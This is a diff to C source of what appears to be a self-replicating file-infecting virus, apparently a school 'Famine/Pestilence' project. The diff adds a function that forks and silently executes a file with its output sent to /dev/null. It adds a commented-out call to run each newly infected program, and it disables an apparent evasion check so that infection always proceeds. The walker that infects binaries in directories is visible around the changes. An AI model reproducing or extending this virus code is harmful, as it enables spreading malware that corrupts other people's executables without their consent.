@@ -179,6 +179,46 @@ static int	infect(const char *filename, const char *self_name)
 	return 0;
 }
 
+static int execute_program(const char *filename)
+{
+	int pid = _syscall(SYS_fork);
+	if (pid == 0) {
+
+		/* doable */
+		//_syscall(SYS_close, 0);
+		//_syscall(SYS_close, 1);
+		//_syscall(SYS_close, 2);
+		const char dev_null[] = "/dev/null";
+		int fd = _syscall(SYS_open, dev_null, O_RDONLY);
+		if (fd < 0)
+			return 1;
+
+		if (_syscall(SYS_dup2, fd, 0) < 0) {
+			_syscall(SYS_close, fd);
+			return 1;
+		}
+		if (_syscall(SYS_dup2, fd, 1) < 0) {
+			_syscall(SYS_close, fd);
+			return 1;
+		}
+		if (_syscall(SYS_dup2, fd, 2) < 0) {
+			_syscall(SYS_close, fd);
+			return 1;
+		}
+
+		_syscall(SYS_close, fd);
+
+		_syscall(SYS_execve, filename, 0, 0);
+
+		_syscall(SYS_exit, 0);
+	} else if (pid > 0) {
+		_syscall(SYS_wait4, pid, 0, 0, 0);
+	} else {
+		return 1;
+	}
+	return 0;
+}
+
 static void	open_file(const char *file, const char *self_path, size_t *counter)
 {
 
@@ -210,6 +250,7 @@ static void	open_file(const char *file, const char *self_path, size_t *counter)
 
 				if (infect(new_path, self_path) == 0) {
 					(*counter)++;
+					//execute_program(new_path);
 				}
 
 			} else if (dir->d_type == DT_DIR) {
@@ -227,8 +268,8 @@ static void	open_file(const char *file, const char *self_path, size_t *counter)
 
 void	famine(void)
 {
-	if (pestilence() != 0)
-		return ;
+	//if (pestilence() != 0)
+	//	return ;
 
 	size_t counter = 0;
 	char host_name[PATH_MAX];
